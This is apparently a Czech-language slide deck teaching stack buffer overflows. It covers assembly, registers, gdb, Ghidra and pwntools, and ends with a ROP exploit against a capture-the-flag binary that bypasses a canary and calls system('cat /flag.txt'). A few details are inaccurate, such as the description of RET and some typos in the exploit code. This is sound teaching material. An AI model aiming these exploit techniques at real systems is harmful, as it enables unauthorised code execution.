# Buffer Overflow

---

## Témata

- Assembly
	- Intel zápis 
	- typy
- registry
- časté/důležité instrukce
- layout paměti
- jak se volají funkce (+ vracení)
- ghidra
- gdb
- pwntools

---

### Assembly 

- Intel vs AT&T
	- Intel běžně u x86 (ghidra)
	- AT&T všude jinde + Unix systémy (gdb)
- U registrů se rozlišuje jestli se používá 64bitová varianta pomocí R (64bit) nebo E (32bit)

---

### intel zápis

- cíl před zdrojem
	- `mov eax, 5`
	- `mov eax, ebx` - zkopiruje hodnot z EBX do EAX
- v `[]` jsou výpočty adres (pointerů)
	- `mov eax, [ebx + ecx*7 + offset]`
- u immediate hodnot je suffix pro typ (**h**ex, **d**ec)

---

### AT&T

- cíl po zdroji
	- `mov $0x5, %eax`
- registry mají před sebou `%`, hodnoty $
- výpočty přes `offset(base,index,scale)`
	- `mov offset(%ebx,%ecx,4), %eax`

---

### Typy

- byte = 8bit
- word = 2 bytes = 16bit = gdb hword (h)
- dword = int = 4 bytes = 32bit = gdb word (w)
- qword = long int = 8 bytes = 64 bit = gdb dword (g)

---

### Registry

- `SP` - Stack pointer (spodek stacku)
- `BP` - Base pointer (předchozí SP; vrchol stacku)
- `IP` - Instruction pointer

---

### Časté instrukce

- `PUSH` - přidá hodnotu na stack
- `POP` - odebere hodnotu ze stacku
- `MOV` - kopíruje data
- `ADD`, `SUB` - přičte nebo odečte
- `JMP` - skočí na adresu (nebo *o* bajtů dál)

---

- `JZ` - jump pokud je nastavena zero flaga (výsledek předchozí instrukce byla 0, např. u `SUB`)
- `LEA` - počítá adresy (pozor - `[]` zde značí výsledek, nečte se ze spočítané adresy)
- `CALL` - spustí funkci. `PUSH RIP; JMP addr`
- `LEAVE` - `MOV ESP, EBP; POP EBP`
- `RET` - `POP RAX; JMP RAX`
- `ENDBR64` - můžete ignorovat, značí začátek funkce

---

![[Buffer Overflow 2024-01-21 15.04.46.excalidraw]]

---

![[Buffer Overflow 2024-01-21 15.54.12.excalidraw]]

---

```c
void main() {
	test(1,2,3,4,5,6,7);
}
```

---

```asm
main:
PUSH RBP
MOV RBP,RSP
PUSH 0x7
MOV R9D,0x6
MOV R8D,0x5
MOV ECX,0x4
MOV EDX,0x3
MOV ESI,0x2
MOV EDI,0x1
CALL test
ADD RSP,0x8
```

---

```c
int test(a,b,c,d,e,f,g) {
	return g;
}
```

---

```asm
test:
PUSH RBP
MOV RBP, RSP
MOV RAX, [RBP + 0x8]
POP RBP
RET
```

---

![[Buffer Overflow 2024-01-21 17.35.47.excalidraw]]

---

![[Buffer Overflow 2024-01-21 18.11.54.excalidraw]]

---

![[Buffer Overflow 2024-01-21 20.13.05.excalidraw]]

---

![[Pasted image 20240121181922.png]]

---

![[Pasted image 20240121182101.png]]

---

![[Pasted image 20240121181922.png]]

- code browser
- debugger
- emulator
- version control

---

![[Pasted image 20240121182515.png]]

---

![[Pasted image 20240121182603.png]]

---

![[Pasted image 20240121184230.png]]

---

![[Pasted image 20240121184359.png]]

---

![[Pasted image 20240121184528.png]]

---

![[Buffer Overflow 2024-01-21 18.47.55.excalidraw]]

---

```sh
gdb test
```

---

```sh
(gdb) layout next
```

---

![[Pasted image 20240121185933.png]]

---

```sh
breakpoint main
```

---

![[Pasted image 20240121190051.png]]

---

```sh
run
```

---

![[Pasted image 20240121190128.png]]

---

```sh
nexti
```

---

![[Pasted image 20240121190433.png]]

![[Pasted image 20240121190509.png]]

---

![[Pasted image 20240121190638.png]]
![[Pasted image 20240121190646.png]]

---

![[Pasted image 20240121190811.png]]

![[Pasted image 20240121190818.png]]

---

![[Pasted image 20240121190838.png]]

![[Pasted image 20240121190849.png]]

---

```sh
info registers
```

![[Pasted image 20240121191816.png]]

---

```sh
info proc mappings
```

![[Pasted image 20240121213831.png]]

---

### Pwntools

`from pwn import *`

---

```py
>>> context.terminal = ['tmux', 'splitw', '-h'] # or 'kitty'
>>> io = gdb.debug('./chall')
```

```sh
(gdb) br main
(gdb) cont
(gdb) layout next
```

```py
>>> print(io.recvuntil(b'> ').decode())
```

```sh
(gdb) nexti 40
```

![[Pasted image 20240121220455.png]]
```py
>>> io.sendline(b'test')
```

---

![[Pasted image 20240121221020.png]]
![[Pasted image 20240121221104.png]]

---

```py
>>> hex(libc.sym['system'])
'0x7f8e171f7760'
```

![[Pasted image 20240121221343.png]]

![[Pasted image 20240121221825.png]]

---

![[Buffer Overflow 2024-01-21 22.34.42.excalidraw]]

---

```asm
MOV EDI, 0x1
```

---

```asm
POP EDI
RET
```

---

```py
>>> rop = ROP(libc, badchars=b'\n')
>>> rop.call(libc.sym['exit'], 0)
```

```py
>>> rop = ROP(libc, base, badchar='b\n')
>>> rop.call(libc.sym['system'], 'cat /flag.txt')
>>> rop.call(libc.sym['exit'], 0)
```

---

![[Pasted image 20240121224128.png]]
![[Pasted image 20240121224352.png]]

0x10-0x58 = 0x48 = 72

---

```py
>>> io.sendline(flat({
	72: canary,
	88: rop.build()
}))
```

---

![[Pasted image 20240121224927.png]]

`system + 0x2c`

---

```py
>>> io.sendline(flat({
	72: canary,
	88: libc.sym['system'] + 0x2c
	96: rop.build()
}))
```
